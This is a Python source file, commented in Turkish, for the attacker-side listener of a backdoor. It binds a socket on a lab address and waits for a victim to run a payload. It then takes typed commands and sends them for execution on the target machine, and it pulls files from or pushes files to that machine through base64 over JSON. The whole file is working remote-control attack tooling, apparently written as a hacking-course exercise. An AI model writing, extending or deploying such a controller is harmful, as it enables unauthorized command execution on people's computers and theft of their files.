import socket         # Backdoor için önce hedefle bağlantı kurmak için bir soket tanımlanır. Sonra da o bağlantıyı dinlemek için bir listener. Biz şuan listener tanımlıyoruz bu kütüphaneyle.
import base64         # txt dosyası harici, içinde binary'nin okuyamadığı özel harfler bulunduran resim, program gibi dosyaların makine diline çevrilip okunmasını ve indirilmesini sağlar.
import simplejson     # Komut çalıştırdığımızda gelen verileri paket şeklinde yani tüm olarak alabilmeyi ve verileri düzgün, okunabilir şekilde vermeyi sağlıyor. Ve python3 uyumu için binary.

class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)# Yukarıdaki soket bağlantısı kopabilir.Bu komut, bağlantı koptuğu zaman aynı soketi birden fazla kez kullanmamızı sağlar
        my_listener.bind((ip, port))                                     # Yine kaynak(linux) ip ve port yazıyoruz.
        my_listener.listen(0)                                            # Kaç bağlantı geldikten sonra listening dursun parametresini 0 yaptık yani hiç durmasın anlamında.
        print("Listening...")                              # Biz programı çalıştırdığımızda daha hedef cihaz payload'ı çalıştırmadan çıkan yazı
        (self.my_connection, my_address) = my_listener.accept() # .accept bize bağlantının kurulduğunu belirtir ve iki argümanla çalışır connection(ip,port) ve hangi adres ile bağlantı kurduğu.
        print("Connection OK from " + str(my_address))      # Payload'ı çalıştırdığında iletişimin kurulduğuna dair çıkan yazı ve bundan sonra komut çalıştırabiliriz hedef cihaz üstünde.

    def json_send(self,data):
        json_data = simplejson.dumps(data)                                     # Veriyi json formatına çeviriyoruz. Encrypted ettik gibi düşün.
        self.my_connection.send(json_data.encode("utf-8"))                     # Python3 uyumu için gönderdiğimiz veriyi utf-8 ile encode ettik. Yoksa her yazdığımız komutta hata veriyor.

    def json_receive(self):
        json_data = ""
        while True: # json formatında veriyi aldığımız için tek bir paket alıp paketi aldıktan sonra hata veriyor. Tüm paketleri almak için txt içindekiler bitene kadar sonsuz loop'a soktuk.
            try:
                json_data = json_data + self.my_connection.recv(1024).decode() # 1024 kısmı, alınan en fazla byte'ı temsil ediyor. decode kısmı, python3 için utf-8 binarysini decode etmek için.
                return simplejson.loads(json_data)                             # Veriyi json formatından normal formata çevirip decrypted ettik gibi düşün.
            except ValueError:                                                 # Hata verirse programı kapatma devam et demek.
                continue

    def command_execution(self, command_input):                                # json_send ve json_receive'yi bir arada kullanıp komut girme ve çıktısını almayı json kütüphanesiyle yapıyoruz.
        self.json_send(command_input)

        if command_input[0] == "quit":
            self.my_connection.close()
            exit()

        return self.json_receive()

    def save_file(self,path,content):          # Burada get_file'den farklı olarak content'in olmasının amacı, içinde o dosyanın binary kodunu içerecek olması ve bunu content ile belirtmemiz.
        with open(path,"wb") as my_file:       # save_file kısmı ise kaynak pcden hedef pc'ye bir dosya yükleme kısmıdır.
            my_file.write(base64.b64decode(content)) # Burada da kendi makinemiden hedef makineye bir şey gönderiyor ve content kısmı binary kodu içerdiğinden b64decode özelliğini kullanıyoruz.
            return "Download OK"

    def get_file_content(self,path):                         # Dosyaları indirmemiz için okumamız gerekiyor. Ama sadece txt dosyalarını okuyup indirmeyeceğimizden binary kullanmamız gerekiyor.
        with open(path,"rb") as my_file:                     # Bunun için "rb" yazıyoruz. Bu bir program olabilir, resim olabilir. Ancak bunu makine diline çevirip okuyup indirebililir.
            return base64.b64encode(my_file.read())          # base64.b64encode; resim, program gibi dosyaların içindeki özel harflerin çözümlenip, okunmasını ve böylece indirilmesini sağlar.

    def start_listener(self):
        while True:
            command_input = input("Enter command: ")
            command_input = command_input.split(" ")  # split fonksiyonu her boşluk koyduğumuzda yazılan kelimeleri ayırmaya yarar. "download as.txt"'de download ile txt'yi ayrı listelere yazar.
            try:
                if command_input[0] == "upload":
                    my_file_content = self.get_file_content(command_input[1]) # my_file_content yüklenecek dosyanın binary kodunu içeriyor.
                    command_input.append(my_file_content) # Karşı tarafa bir dosya yüklerken onun binary koduyla birlikte göndermemiz gerekiyor. Ama bunu biz elle yazmıyoruz input'a ekliyoruz.

                command_output = self.command_execution(command_input)

                if command_input[0] == "download" and "Error!" not in command_output: # Komut çıktısında errorluk bi durum yoksa ve download varsa bu işlemi gerçekleştir demek.
                    command_output = self.save_file(command_input[1],command_output)
            except Exception:
                command_output = "Error" # cd, download, upload gibi bilinmedik bir input girilmişse örn eren gibi; programın direk kapanmamasını, error yazdırmasını ve devam etmesini sağlıyor.
            print(command_output)

my_socket_listener = SocketListener("10.0.2.15",8080)
my_socket_listener.start_listener()